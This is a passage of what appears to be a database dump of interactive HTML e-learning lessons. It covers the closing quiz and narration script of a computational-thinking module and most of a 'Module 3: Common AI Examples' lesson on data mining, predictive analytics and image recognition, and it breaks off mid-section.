pattern, she could build one generic solution and reuse it — saving time and reducing errors.'' },\n      _: { ok: false, title: ''❌ Not quite.'', text: ''This is pattern recognition — identifying that two sub-problems share the same structure. Once you spot a pattern, you can write a single reusable solution instead of duplicating code.'' }\n    },\n    branch: {\n      B:  [{ icon:''🏆'', label:''View your results!'', action: showResults }],\n      _:  [{ icon:''📊'', label:''View results anyway'', action: showResults }]\n    }\n  }\n};\n\n// ── NAVIGATION ─────────────────────────────────────────────────────────\nfunction goTo(n) {\n  document.getElementById(''screen-'' + currentScreen).classList.remove(''active'');\n  currentScreen = n;\n  document.getElementById(''screen-'' + n).classList.add(''active'');\n  window.scrollTo({ top: 0, behavior: ''smooth'' });\n  updateProgress();\n  stopNarration();\n}\n\nfunction updateProgress() {\n  const pct = Math.round((currentScreen / (TOTAL_SCREENS - 1)) * 100);\n  document.getElementById(''progress-fill'').style.width = pct + ''%'';\n  document.getElementById(''progress-pct'').textContent = pct + ''%'';\n  const labels = [''Intro'',''Key Concepts'',''Problem Analysis'',''Quiz Q1'',''Quiz Q2'',''Quiz Q3'',''Quiz Q4'',''Quiz Q5'',''Results''];\n  document.getElementById(''progress-text'').textContent = labels[currentScreen] || '''';\n}\n\n// ── NARRATION ──────────────────────────────────────────────────────────\nfunction toggleNarration(ch) {\n  if (playingChapter === ch && currentUtterance) {\n    stopNarration();\n    return;\n  }\n  stopNarration();\n  const text = narration[ch];\n  if (!text || !speechSynth) return;\n\n  currentUtterance = new SpeechSynthesisUtterance(text);\n  currentUtterance.rate = 0.92;\n  currentUtterance.pitch = 1;\n  currentUtterance.volume = 1;\n\n  const btn = document.getElementById(''narr-btn-'' + ch);\n  const waves = document.getElementById(''narr-waves-'' + ch);\n  btn.classList.add(''playing'');\n  btn.innerHTML = ''<svg viewBox="0 0 24 24"><path d="M6 19h4V5H6v14zm8-14v14h4V5h-4z"/></svg>'';\n  waves.classList.add(''active'');\n  playingChapter = ch;\n\n  currentUtterance.onend = () => resetNarrBtn(ch);\n  currentUtterance.onerror = () => resetNarrBtn(ch);\n  speechSynth.speak(currentUtterance);\n}\n\nfunction stopNarration() {\n  if (speechSynth) speechSynth.cancel();\n  if (playingChapter !== null) resetNarrBtn(playingChapter);\n  playingChapter = null;\n  currentUtterance = null;\n}\n\nfunction resetNarrBtn(ch) {\n  const btn = document.getElementById(''narr-btn-'' + ch);\n  const waves = document.getElementById(''narr-waves-'' + ch);\n  if (!btn) return;\n  btn.classList.remove(''playing'');\n  btn.innerHTML = ''<svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>'';\n  if (waves) waves.classList.remove(''active'');\n}\n\n// ── QUIZ LOGIC ─────────────────────────────────────────────────────────\nfunction answerQ(qNum, choice) {\n  if (answered[qNum]) return;\n  answered[qNum] = choice;\n\n  const data = quizData[qNum];\n  const isCorrect = choice === data.correct;\n  if (isCorrect) score++; else wrongCount++;\n\n  // style options\n  const opts = document.querySelectorAll(''#opts-q'' + qNum + '' .option-btn'');\n  opts.forEach((btn, i) => {\n    const letters = [''A'',''B'',''C'',''D''];\n    btn.onclick = null;\n    if (letters[i] === data.correct) btn.classList.add(''correct'');\n    else if (letters[i] === choice && !isCorrect) btn.classList.add(''wrong'');\n    else btn.style.opacity = ''0.45'';\n    btn.querySelector(''.option-letter'').textContent = letters[i];\n  });\n\n  // feedback\n  const fbBox = document.getElementById(''fb-q'' + qNum);\n  const fbData = data.feedback[choice] || data.feedback[''_''];\n  fbBox.className = ''feedback-box '' + (fbData.ok ? ''correct'' : ''wrong'');\n  fbBox.innerHTML = ''<div class="fb-title">'' + fbData.title + ''</div><p>'' + fbData.text + ''</p>'';\n  fbBox.style.display = ''block'';\n\n  // branches\n  const branchWrap = document.getElementById(''branch-q'' + qNum);\n  const branches = data.branch[choice] || data.branch[''_''];\n  branchWrap.innerHTML = '''';\n  branches.forEach(b => {\n    const btn = document.createElement(''button'');\n    btn.className = ''branch-btn'';\n    btn.innerHTML = ''<span class="branch-icon">'' + b.icon + ''</span>'' + b.label;\n    btn.onclick = b.action;\n    branchWrap.appendChild(btn);\n  });\n  branchWrap.classList.add(''show'');\n}\n\nfunction showResults() {\n  const pct = Math.round((score / 5) * 100);\n  document.getElementById(''score-num'').textContent = score + ''/5'';\n  document.getElementById(''score-ring'').style.setProperty(''--pct'', pct + ''%'');\n  // animate conic\n  document.getElementById(''score-ring'').style.background =\n    `conic-gradient(var(--cyan) ${pct}%, var(--glass-border) 0%)`;\n  document.getElementById(''rs-correct'').textContent = score;\n  document.getElementById(''rs-wrong'').textContent = wrongCount;\n  document.getElementById(''rs-pct'').textContent = pct + ''%'';\n\n  let title, desc;\n  if (pct === 100) { title = ''🏆 Perfect Score!''; desc = ''Outstanding! You have a thorough understanding of Computing Key Concepts and Computational Thinking Problem Analysis. You\\''re ready for the next module.''; }\n  else if (pct >= 80) { title = ''🌟 Excellent Work!''; desc = ''Strong performance! Review any questions you missed, then move on to the next module with confidence.''; }\n  else if (pct >= 60) { title = ''👍 Good Effort!''; desc = ''You\\''re on the right track. Consider revisiting the chapters on the topics you missed before moving on.''; }\n  else { title = ''📚 Keep Practising''; desc = ''No worries — learning takes time. Revisit the Key Concepts and Problem Analysis chapters, then try the quiz again!''; }\n\n  document.getElementById(''results-title'').textContent = title;\n  document.getElementById(''results-desc'').textContent = desc;\n  goTo(8);\n\n  // reset for replay\n  score = 0; wrongCount = 0; answered = {};\n}\n\n// Init\nupdateProgress();\n</script>\n</body>\n</html>\n', 'html_interactive', NULL, NULL, NULL, NULL, 0, 0, 4, 'Published', 1, '2026-03-10 02:45:44', '2026-03-10 14:15:52', NULL, NULL),
(18, 7, NULL, 'Module 3 Interactive Lesson', '', '<!DOCTYPE html>\n<html lang="en">\n<head>\n<meta charset="UTF-8">\n<meta name="viewport" content="width=device-width, initial-scale=1.0">\n<title>Module 3: Common AI Examples | M.T.T.I</title>\n<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=DM+Sans:ital,wght@0,300;0,400;0,500;1,300&display=swap" rel="stylesheet">\n<style>\n  :root {\n    --bg: #0a0e1a;\n    --surface: #111827;\n    --surface2: #1a2235;\n    --accent: #00d4aa;\n    --accent2: #ff6b35;\n    --accent3: #7c3aed;\n    --text: #e8eaf0;\n    --text-muted: #8892a4;\n    --border: rgba(255,255,255,0.08);\n    --success: #22c55e;\n    --error: #ef4444;\n    --warning: #f59e0b;\n  }\n\n  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }\n\n  body {\n    background: var(--bg);\n    color: var(--text);\n    font-family: ''DM Sans'', sans-serif;\n    font-size: 16px;\n    line-height: 1.7;\n    min-height: 100vh;\n    overflow-x: hidden;\n  }\n\n  /* Animated background */\n  body::before {\n    content: '''';\n    position: fixed;\n    inset: 0;\n    background:\n      radial-gradient(ellipse 600px 400px at 10% 20%, rgba(0,212,170,0.06) 0%, transparent 60%),\n      radial-gradient(ellipse 500px 300px at 90% 80%, rgba(124,58,237,0.07) 0%, transparent 60%),\n      radial-gradient(ellipse 400px 400px at 50% 50%, rgba(255,107,53,0.03) 0%, transparent 60%);\n    pointer-events: none;\n    z-index: 0;\n  }\n\n  .app { position: relative; z-index: 1; max-width: 900px; margin: 0 auto; padding: 0 24px 80px; }\n\n  /* Header */\n  header {\n    padding: 40px 0 20px;\n    border-bottom: 1px solid var(--border);\n    margin-bottom: 40px;\n  }\n  .institute-tag {\n    display: inline-flex; align-items: center; gap: 8px;\n    background: rgba(0,212,170,0.1); border: 1px solid rgba(0,212,170,0.3);\n    color: var(--accent); font-size: 12px; font-weight: 600;\n    padding: 5px 14px; border-radius: 100px; letter-spacing: 1.5px;\n    text-transform: uppercase; margin-bottom: 16px;\n  }\n  .institute-tag::before { content: ''●''; font-size: 8px; animation: pulse 2s infinite; }\n  @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.3} }\n  header h1 {\n    font-family: ''Syne'', sans-serif; font-size: clamp(28px,5vw,48px);\n    font-weight: 800; line-height: 1.15;\n    background: linear-gradient(135deg, #fff 0%, var(--accent) 60%, var(--accent3) 100%);\n    -webkit-background-clip: text; -webkit-text-fill-color: transparent;\n    background-clip: text;\n  }\n  header p { color: var(--text-muted); margin-top: 10px; font-size: 15px; }\n\n  /* Progress bar */\n  .progress-wrap {\n    display: flex; align-items: center; gap: 16px;\n    background: var(--surface); border: 1px solid var(--border);\n    border-radius: 16px; padding: 16px 20px; margin-bottom: 32px;\n  }\n  .progress-label { font-size: 12px; font-weight: 600; color: var(--text-muted); white-space: nowrap; text-transform: uppercase; letter-spacing: 1px; }\n  .progress-bar { flex: 1; height: 6px; background: var(--surface2); border-radius: 99px; overflow: hidden; }\n  .progress-fill { height: 100%; background: linear-gradient(90deg, var(--accent), var(--accent3)); border-radius: 99px; transition: width 0.5s cubic-bezier(.4,0,.2,1); }\n  .progress-pct { font-family: ''Syne'', sans-serif; font-weight: 700; font-size: 14px; color: var(--accent); }\n\n  /* Voice controls */\n  .voice-bar {\n    display: flex; align-items: center; gap: 12px;\n    background: var(--surface); border: 1px solid var(--border);\n    border-radius: 16px; padding: 14px 18px; margin-bottom: 32px;\n    flex-wrap: wrap;\n  }\n  .voice-title { font-size: 12px; font-weight: 600; text-transform: uppercase; letter-spacing: 1px; color: var(--text-muted); }\n  .btn-voice {\n    display: inline-flex; align-items: center; gap: 7px;\n    padding: 8px 16px; border-radius: 10px; border: none; cursor: pointer;\n    font-family: ''DM Sans'', sans-serif; font-size: 13px; font-weight: 500;\n    transition: all 0.2s; white-space: nowrap;\n  }\n  .btn-voice.play { background: var(--accent); color: #000; }\n  .btn-voice.play:hover { background: #00f0c0; transform: translateY(-1px); }\n  .btn-voice.stop { background: var(--surface2); color: var(--text); border: 1px solid var(--border); }\n  .btn-voice.stop:hover { background: var(--surface); }\n  .voice-status {\n    font-size: 12px; color: var(--text-muted); padding: 5px 10px;\n    background: rgba(0,0,0,0.3); border-radius: 8px;\n  }\n  .voice-status.speaking { color: var(--accent); }\n  .speed-wrap { display: flex; align-items: center; gap: 8px; margin-left: auto; }\n  .speed-wrap label { font-size: 12px; color: var(--text-muted); }\n  .speed-wrap input[type=range] { accent-color: var(--accent); width: 80px; }\n\n  /* Section card */\n  .section-card {\n    background: var(--surface); border: 1px solid var(--border);\n    border-radius: 20px; margin-bottom: 28px;\n    overflow: hidden; transition: border-color 0.3s;\n    animation: fadeUp 0.5s ease both;\n  }\n  @keyframes fadeUp { from{opacity:0;transform:translateY(20px)} to{opacity:1;transform:none} }\n  .section-card:hover { border-color: rgba(0,212,170,0.25); }\n\n  .section-header {\n    display: flex; align-items: center; gap: 14px;\n    padding: 22px 28px; cursor: pointer; user-select: none;\n    border-bottom: 1px solid transparent; transition: background 0.2s;\n  }\n  .section-header:hover { background: rgba(255,255,255,0.02); }\n  .section-header.open { border-bottom-color: var(--border); }\n  .section-icon {\n    width: 42px; height: 42px; border-radius: 12px;\n    display: grid; place-items: center; font-size: 20px; flex-shrink: 0;\n  }\n  .section-num { font-size: 11px; font-weight: 700; color: var(--text-muted); letter-spacing: 1.5px; text-transform: uppercase; }\n  .section-title { font-family: ''Syne'', sans-serif; font-size: 17px; font-weight: 700; }\n  .section-chevron { margin-left: auto; color: var(--text-muted); transition: transform 0.3s; font-size: 18px; }\n  .section-header.open .section-chevron { transform: rotate(180deg); }\n\n  .section-body { padding: 28px; display: none; }\n  .section-body.open { display: block; }\n\n  /* Content elements */\n  .lead-text { font-size: 15px; color: var(--text-muted); margin-bottom: 20px; font-style: italic; }\n  h3 { font-family: ''Syne'', sans-serif; font-size: 16px; font-weight: 700; color: var(--accent); margin: 24px 0 12px; }\n  h3:first-child { margin-top: 0; }\n\n  .table-wrap { overflow-x: auto; margin: 16px 0; border-radius: 12px; border: 1px solid var(--border); }\n  table { width: 100%; border-collapse: collapse; font-size: 14px; }\n  th { background: var(--surface2); padding: 12px 16px; text-align: left; font-family: ''Syne'', sans-serif; font-size: 12px; font-weight: 700; letter-spacing: 1px; text-transform: uppercase; color: var(--text-muted); }\n  td { padding: 11px 16px; border-top: 1px solid var(--border); vertical-align: top; }\n  tr:hover td { background: rgba(255,255,255,0.02); }\n  td strong { color: var(--accent); font-weight: 600; }\n\n  .chip-grid { display: flex; flex-wrap: wrap; gap: 8px; margin: 12px 0; }\n  .chip {\n    padding: 6px 14px; border-radius: 99px; font-size: 13px; font-weight: 500;\n    background: var(--surface2); border: 1px solid var(--border); color: var(--text);\n    transition: all 0.2s;\n  }\n  .chip:hover { border-color: var(--accent); color: var(--accent); transform: translateY(-1px); }\n  .chip.accent { background: rgba(0,212,170,0.1); border-color: rgba(0,212,170,0.3); color: var(--accent); }\n  .chip.purple { background: rgba(124,58,237,0.1); border-color: rgba(124,58,237,0.3); color: #a78bfa; }\n  .chip.orange { background: rgba(255,107,53,0.1); border-color: rgba(255,107,53,0.3); color: var(--accent2); }\n\n  .info-box {\n    border-radius: 12px; padding: 16px 18px; margin: 14px 0;\n    border-left: 3px solid;\n  }\n  .info-box.teal { background: rgba(0,212,170,0.07); border-color: var(--accent); }\n  .info-box.orange { background: rgba(255,107,53,0.07); border-color: var(--accent2); }\n  .info-box.purple { background: rgba(124,58,237,0.07); border-color: var(--accent3); }\n  .info-box strong { font-weight: 600; display: block; margin-bottom: 4px; }\n\n  ul { padding-left: 18px; }\n  li { margin-bottom: 6px; font-size: 15px; }\n\n  /* Scenario quiz */\n  .scenario-section {\n    background: var(--bg);\n    border: 1px solid var(--border);\n    border-radius: 20px;\n    padding: 32px;\n    margin-bottom: 40px;\n    animation: fadeUp 0.5s ease both;\n  }\n  .scenario-tag {\n    display: inline-block; background: rgba(255,107,53,0.15);\n    border: 1px solid rgba(255,107,53,0.35); color: var(--accent2);\n    font-size: 11px; font-weight: 700; letter-spacing: 1.5px; text-transform: uppercase;\n    padding: 4px 12px; border-radius: 99px; margin-bottom: 16px;\n  }\n  .scenario-title { font-family: ''Syne'', sans-serif; font-size: 22px; font-weight: 800; margin-bottom: 8px; }\n  .scenario-desc { color: var(--text-muted); font-size: 15px; margin-bottom: 24px; }\n\n  .scenario-context {\n    background: var(--surface); border: 1px solid var(--border);\n    border-radius: 14px; padding: 20px 24px; margin-bottom: 24px;\n    border-left: 3px solid var(--accent2);\n  }\n  .scenario-context p { font-size: 15px; }\n\n  .question-card {\n    background: var(--surface); border: 1px solid var(--border);\n    border-radius: 16px; padding: 24px; margin-bottom: 20px;\n  }\n  .question-num { font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 1.5px; color: var(--text-muted); margin-bottom: 8px; }\n  .question-text { font-family: ''Syne'', sans-serif; font-size: 16px; font-weight: 600; margin-bottom: 18px; }\n\n  .options { display: flex; flex-direction: column; gap: 10px; }\n  .option-btn {\n    display: flex; align-items: flex-start; gap: 12px;\n    background: var(--surface2); border: 1px solid var(--border);\n    border-radius: 12px; padding: 14px 18px; cursor: pointer;\n    transition: all 0.2s; text-align: left; font-family: ''DM Sans'', sans-serif;\n    font-size: 14px; color: var(--text); line-height: 1.5;\n  }\n  .option-btn:hover:not(:disabled) { border-color: var(--accent); background: rgba(0,212,170,0.06); transform: translateX(3px); }\n  .option-btn .opt-letter {\n    width: 26px; height: 26px; border-radius: 8px; background: rgba(255,255,255,0.06);\n    display: grid; place-items: center; font-weight: 700; font-size: 12px; flex-shrink: 0;\n    font-family: ''Syne'', sans-serif;\n  }\n  .option-btn.correct { background: rgba(34,197,94,0.12); border-color: var(--success); color: #bbf7d0; }\n  .option-btn.correct .opt-letter { background: var(--success); color: #000; }\n  .option-btn.wrong { background: rgba(239,68,68,0.1); border-color: var(--error); color: #fca5a5; }\n  .option-btn.wrong .opt-letter { background: var(--error); color: #fff; }\n  .option-btn:disabled { cursor: default; }\n\n  .feedback-box {\n    margin-top: 14px; padding: 14px 18px; border-radius: 10px;\n    font-size: 14px; display: none;\n  }\n  .feedback-box.correct { background: rgba(34,197,94,0.1); border: 1px solid rgba(34,197,94,0.3); color: #86efac; }\n  .feedback-box.wrong { background: rgba(239,68,68,0.08); border: 1px solid rgba(239,68,68,0.25); color: #fca5a5; }\n  .feedback-box strong { display: block; margin-bottom: 4px; font-weight: 600; }\n\n  /* Branch path */\n  .branch-result {\n    display: none; margin-top: 18px;\n    padding: 18px 20px; border-radius: 12px;\n    border: 1px solid; font-size: 14px;\n  }\n  .branch-result.show { display: block; }\n  .branch-result.good { background: rgba(0,212,170,0.08); border-color: rgba(0,212,170,0.3); }\n  .branch-result.okay { background: rgba(245,158,11,0.08); border-color: rgba(245,158,11,0.3); }\n  .branch-result.retry { background: rgba(239,68,68,0.08); border-color: rgba(239,68,68,0.3); }\n  .branch-icon { font-size: 28px; margin-bottom: 8px; }\n  .branch-result h4 { font-family: ''Syne'', sans-serif; font-weight: 700; margin-bottom: 6px; }\n\n  .quiz-score {\n    background: linear-gradient(135deg, var(--surface), var(--surface2));\n    border: 1px solid var(--border); border-radius: 16px;\n    padding: 24px; margin-top: 20px; text-align: center; display: none;\n  }\n  .quiz-score.show { display: block; }\n  .score-num { font-family: ''Syne'', sans-serif; font-size: 48px; font-weight: 800; }\n  .score-num.high { color: var(--accent); }\n  .score-num.mid { color: var(--warning); }\n  .score-num.low { color: var(--error); }\n  .score-label { font-size: 14px; color: var(--text-muted); margin-top: 4px; }\n\n  /* Navigation buttons */\n  .nav-row { display: flex; align-items: center; justify-content: space-between; margin-top: 40px; flex-wrap: wrap; gap: 12px; }\n  .btn {\n    display: inline-flex; align-items: center; gap: 8px;\n    padding: 12px 24px; border-radius: 12px; border: none; cursor: pointer;\n    font-family: ''Syne'', sans-serif; font-size: 14px; font-weight: 700;\n    transition: all 0.2s; text-decoration: none;\n  }\n  .btn-primary { background: var(--accent); color: #000; }\n  .btn-primary:hover { background: #00f0c0; transform: translateY(-2px); box-shadow: 0 8px 24px rgba(0,212,170,0.3); }\n  .btn-secondary { background: var(--surface); color: var(--text); border: 1px solid var(--border); }\n  .btn-secondary:hover { border-color: var(--accent); color: var(--accent); }\n  .btn-danger { background: rgba(239,68,68,0.1); color: #fca5a5; border: 1px solid rgba(239,68,68,0.3); }\n  .btn-danger:hover { background: rgba(239,68,68,0.2); }\n\n  /* Module nav pills */\n  .module-nav {\n    display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 32px;\n  }\n  .module-pill {\n    padding: 7px 16px; border-radius: 99px; border: 1px solid var(--border);\n    background: var(--surface); color: var(--text-muted); font-size: 13px;\n    font-weight: 500; cursor: pointer; transition: all 0.2s;\n  }\n  .module-pill:hover { border-color: var(--accent); color: var(--accent); }\n  .module-pill.active { background: var(--accent); border-color: var(--accent); color: #000; font-weight: 700; }\n  .module-pill.done { border-color: rgba(34,197,94,0.4); color: var(--success); }\n\n  /* View pages */\n  .page { display: none; }\n  .page.active { display: block; }\n\n  /* Final certificate */\n  .certificate {\n    text-align: center; padding: 48px 32px;\n    background: linear-gradient(135deg, var(--surface) 0%, var(--surface2) 100%);\n    border: 1px solid rgba(0,212,170,0.3); border-radius: 24px;\n    margin-top: 32px;\n  }\n  .cert-icon { font-size: 64px; margin-bottom: 16px; }\n  .cert-title { font-family: ''Syne'', sans-serif; font-size: 28px; font-weight: 800;\n    background: linear-gradient(135deg, var(--accent), var(--accent3));\n    -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;\n  }\n  .cert-sub { color: var(--text-muted); margin-top: 8px; margin-bottom: 24px; }\n  .cert-score-wrap { display: flex; justify-content: center; gap: 24px; flex-wrap: wrap; margin-top: 24px; }\n  .cert-stat { background: var(--bg); border: 1px solid var(--border); border-radius: 12px; padding: 16px 24px; }\n  .cert-stat-num { font-family: ''Syne'', sans-serif; font-size: 28px; font-weight: 800; color: var(--accent); }\n  .cert-stat-label { font-size: 12px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 1px; }\n\n  @media (max-width: 600px) {\n    .section-body { padding: 20px; }\n    .scenario-section { padding: 20px; }\n    .voice-bar { gap: 8px; }\n    .speed-wrap { margin-left: 0; }\n  }\n</style>\n</head>\n<body>\n<div class="app">\n\n  <header>\n    <div class="institute-tag">M.T.T.I · ICDL Professional</div>\n    <h1>Module 3: Common AI Examples</h1>\n    <p>Interactive lesson with voice narration, scenario exploration, and branching assessment</p>\n  </header>\n\n  <!-- Progress -->\n  <div class="progress-wrap">\n    <span class="progress-label">Your Progress</span>\n    <div class="progress-bar"><div class="progress-fill" id="progressFill" style="width:0%"></div></div>\n    <span class="progress-pct" id="progressPct">0%</span>\n  </div>\n\n  <!-- Voice Controls -->\n  <div class="voice-bar">\n    <span class="voice-title">🎙 Voice Narration</span>\n    <button class="btn-voice play" onclick="startNarration()">▶ Play Section</button>\n    <button class="btn-voice stop" onclick="stopNarration()">■ Stop</button>\n    <span class="voice-status" id="voiceStatus">Ready</span>\n    <div class="speed-wrap">\n      <label>Speed: <span id="speedLabel">1x</span></label>\n      <input type="range" min="0.6" max="1.6" step="0.1" value="1" id="speedRange" oninput="updateSpeed(this.value)">\n    </div>\n  </div>\n\n  <!-- Module nav -->\n  <div class="module-nav">\n    <button class="module-pill active" id="pill-0" onclick="showPage(0)">3.1 Why AI?</button>\n    <button class="module-pill" id="pill-1" onclick="showPage(1)">3.2 Data Mining</button>\n    <button class="module-pill" id="pill-2" onclick="showPage(2)">3.3 Predictive Analytics</button>\n    <button class="module-pill" id="pill-3" onclick="showPage(3)">3.4 Image Recognition</button>\n    <button class="module-pill" id="pill-4" onclick="showPage(4)">3.5 NLP</button>\n    <button class="module-pill" id="pill-5" onclick="showPage(5)">3.6 Decision Systems</button>\n    <button class="module-pill" id="pill-6" onclick="showPage(6)">📝 Scenario Quiz</button>\n    <button class="module-pill" id="pill-7" onclick="showPage(7)">🏁 Summary</button>\n  </div>\n\n  <!-- PAGE 0: Why Organizations Need AI -->\n  <div class="page active" id="page-0" data-narration="Welcome to Module 3: Common AI Examples. This section explores how artificial intelligence is applied in real organizations and society. Organizations need AI for several key reasons. First, to automate repetitive tasks that would otherwise consume hours of human time. Second, to handle growing volumes of data that are too large for humans to process manually. Third, to provide customer service around the clock, twenty-four hours a day, seven days a week. Fourth, to make faster, data-driven decisions with greater accuracy. Fifth, to gain competitive advantage over rivals. Sixth, to reduce operational costs and improve efficiency. Seventh, to improve customer experience through personalization. And eighth, to scale operations efficiently as the organization grows. These are powerful motivators that are driving AI adoption across every industry worldwide.">\n    <div class="section-card" style="animation-delay:0.1s">\n      <div class="section-header open" onclick="toggleSection(this)">\n        <div class="section-icon" style="background:rgba(0,212,170,0.15)">🏢</div>\n        <div>\n          <div class="section-num">Section 3.1</div>\n          <div class="section-title">Why Organizations Need AI</div>\n        </div>\n        <span class="section-chevron">⌄</span>\n      </div>\n      <div class="section-body open">\n        <p class="lead-text">Identifying the need for AI in organizations and society — the core drivers behind AI adoption.</p>\n        <h3>Key Drivers for AI Adoption</h3>\n        <div class="chip-grid">\n          <span class="chip accent">Automate repetitive tasks</span>\n          <span class="chip accent">Handle large data volumes</span>\n          <span class="chip accent">24/7 customer service</span>\n          <span class="chip purple">Faster decision-making</span>\n          <span class="chip purple">Competitive advantage</span>\n          <span class="chip orange">Reduce costs</span>\n          <span class="chip orange">Improve customer experience</span>\n          <span class="chip">Scale efficiently</span>\n        </div>\n        <div class="info-box teal">\n          <strong>💡 Key Insight</strong>\n          AI doesn''t replace organizations — it amplifies what they can do. A team of 10 people using AI can often outperform a team of 100 working manually.\n        </div>\n        <h3>Real-World Business Context</h3>\n        <ul>\n          <li>A bank processes <strong>millions of transactions</strong> daily — AI detects fraud in milliseconds</li>\n          <li>A hospital receives thousands of X-rays — AI flags abnormalities before the radiologist reads them</li>\n          <li>An e-commerce site has millions of products — AI recommends the right item to each visitor</li>\n          <li>A call centre handles 10,000 queries/day — AI resolves 70% automatically</li>\n        </ul>\n      </div>\n    </div>\n    <div class="nav-row">\n      <span></span>\n      <button class="btn btn-primary" onclick="showPage(1)">Next: Data Mining →</button>\n    </div>\n  </div>\n\n  <!-- PAGE 1: Data Mining -->\n  <div class="page" id="page-1" data-narration="Section 3.2: Data Mining Applications. Data mining uses artificial intelligence to discover hidden patterns and insights in large datasets. There are five major application areas. First, Market Basket Analysis — this finds items that are frequently purchased together. For example, supermarkets discover that customers who buy bread also buy milk, so they place these items strategically. Second, Fraud Detection — AI identifies unusual patterns in transaction data. Banks use this to detect suspicious activity the moment it happens. Third, Customer Churn Prediction — AI predicts which customers are likely to leave a service. Telecom companies use this to target at-risk customers with special offers before they cancel. Fourth, Recommendation Engines — these suggest relevant products or content to users. Netflix uses this to recommend shows you are likely to enjoy based on your viewing history. Fifth, Sentiment Analysis — AI analyses the emotional tone in written text, whether it is positive, negative, or neutral. Companies monitor social media to understand how customers feel about their brand.">\n    <div class="section-card">\n      <div class="section-header open" onclick="toggleSection(this)">\n        <div class="section-icon" style="background:rgba(124,58,237,0.15)">⛏</div>\n        <div>\n          <div class="section-num">Section 3.2</div>\n          <div class="section-title">Data Mining Applications</div>\n        </div>\n        <span class="section-chevron">⌄</span>\n      </div>\n      <div class="section-body open">\n        <p class="lead-text">Pattern discovery and analysis — how AI finds insights hidden inside massive datasets.</p>\n        <div class="table-wrap">\n          <table>\n            <thead><tr><th>Application</th><th>What It Does</th><th>Real Example</th></tr></thead>\n            <tbody>\n              <tr><td><strong>Market Basket Analysis</strong></td><td>Finds items frequently bought together</td><td>Supermarkets: bread buyers also buy milk</td></tr>\n              <tr><td><strong>Fraud Detection</strong></td><td>Identifies unusual transaction patterns</td><td>Banks flagging suspicious card usage</td></tr>\n              <tr><td><strong>Customer Churn</strong></td><td>Predicts which customers will leave</td><td>Telecom targeting at-risk subscribers</td></tr>\n              <tr><td><strong>Recommendation</strong></td><td>Suggests relevant content/products</td><td>Netflix recommending shows you''ll love</td></tr>\n              <tr><td><strong>Sentiment Analysis</strong></td><td>Analyses emotional tone in text</td><td>Brands monitoring social media reactions</td></tr>\n            </tbody>\n          </table>\n        </div>\n        <div class="info-box purple">\n          <strong>🔍 How It Works</strong>\n          Data mining AI processes millions of data points simultaneously, finding correlations that would take human analysts years to uncover. The bigger the dataset, the better the insights.\n        </div>\n      </div>\n    </div>\n    <div class="nav-row">\n      <button class="btn btn-secondary" onclick="showPage(0)">← Previous</button>\n      <button class="btn btn-primary" onclick="showPage(2)">Next: Predictive Analytics →</button>\n    </div>\n  </div>\n\n  <!-- PAGE 2: Predictive Analytics -->\n  <div class="page" id="page-2" data-narration="Section 3.3: Predictive Analytics and Business Intelligence. Predictive analytics uses historical data to forecast future outcomes. Think of it as AI learning from the past to predict the future. Key business applications include: Sales forecasting — predicting next quarter''s revenue with remarkable accuracy. Demand planning — estimating product demand so companies avoid over or understocking. Risk assessment — evaluating the probability that a loan applicant will default. Maintenance prediction — anticipating when a machine will fail before it breaks down, saving enormous costs. Employee attrition — identifying staff who are likely to resign, so managers can intervene early. Price optimisation — setting dynamic prices based on demand, like airline ticket pricing that changes by the hour. Supply chain management — optimising logistics and delivery routes in real time.">\n    <div class="section-card">\n      <div class="section-header open" onclick="toggleSection(this)">\n        <div class="section-icon" style="background:rgba(245,158,11,0.15)">📈</div>\n        <div>\n          <div class="section-num">Section 3.3</div>\n          <div class="section-title">Predictive Analytics & Business Intelligence</div>\n        </div>\n        <span class="section-chevron">⌄</span>\n      </div>\n      <div class="section-body open">\n        <p class="lead-text">Using historical data to forecast future outcomes — AI learning from the past to predict the future.</p>\n        <h3>Business Applications</h3>\n        <div class="chip-grid">\n          <span class="chip orange">📊 Sales forecasting</span>\n          <span class="chip orange">📦 Demand planning</span>\n          <span class="chip orange">💳 Risk assessment</span>\n          <span class="chip orange">🔧 Maintenance prediction</span>\n          <span class="chip orange">👥 Employee attrition</span>\n          <span class="chip orange">💰 Price optimisation</span>\n          <span class="chip orange">🚛 Supply chain</span>\n        </div>\n        <div class="info-box orange">\n          <strong>📌 Classic Example: Predictive Maintenance</strong>\n          A manufacturing factory fits sensors on machinery. AI analyses vibration patterns, temperature and output data. It predicts a motor failure 2 weeks before it happens — the company schedules maintenance and avoids a KES 5 million production stoppage.\n        </div>\n        <h3>Industries Using Predictive Analytics</h3>\n        <ul>\n          <li><strong>Finance</strong> — credit scoring, investment return predictions</li>\n          <li><strong>Retail</strong> — inventory management, seasonal demand planning</li>\n          <li><strong>Healthcare</strong> — patient readmission risk, epidemic forecasting</li>\n          <li><strong>Agriculture</strong> — crop yield predictions, weather-based planting advice</li>\n        </ul>\n      </div>\n    </div>\n    <div class="nav-row">\n      <button class="btn btn-secondary" onclick="showPage(1)">← Previous</button>\n      <button class="btn btn-primary" onclick="showPage(3)">Next: Image Recognition →</button>\n    </div>\n  </div>\n\n  <!-- PAGE 3: Image Recognition -->\n  <div class="page" id="page-3" data-narration="Section 3.4: Image Recognition and Computer Vision. Image recognition AI can identify objects, people, text, and scenes in photographs and video. Let''s look at practical applications across different sectors. In Security — facial recognition is used for building access control and surveillance cameras. In Healthcare — AI detects diseases in X-rays, MRI scans, and CT images, often with accuracy matching specialist doctors. In Retail — automated checkout systems use computer vision to scan items without barcodes. In Agriculture — AI analyses drone footage to identify plant diseases and monitor crop health across thousands of hectares simultaneously. In Automotive — self-driving cars use computer vision to recognise pedestrians, read road signs, and avoid obstacles in real time. In Social Media — platforms automatically tag people in photos and moderate harmful content at scale. In E-commerce — visual search lets shoppers upload a photo and find matching products instantly. Computer vision in manufacturing performs quality inspection, spotting microscopic defects faster than any human inspector.">\n    <div class="section-card">\n      <div class="section-header open" onclick="toggleSection(this)">\n        <div class="section-icon" style="background:rgba(0,212,170,0.15)">👁</div>\n        <div>\n          <div class="section-num">Section 3.4 & 3.5</div>\n          <div class="section-title">Image Recognition & Computer 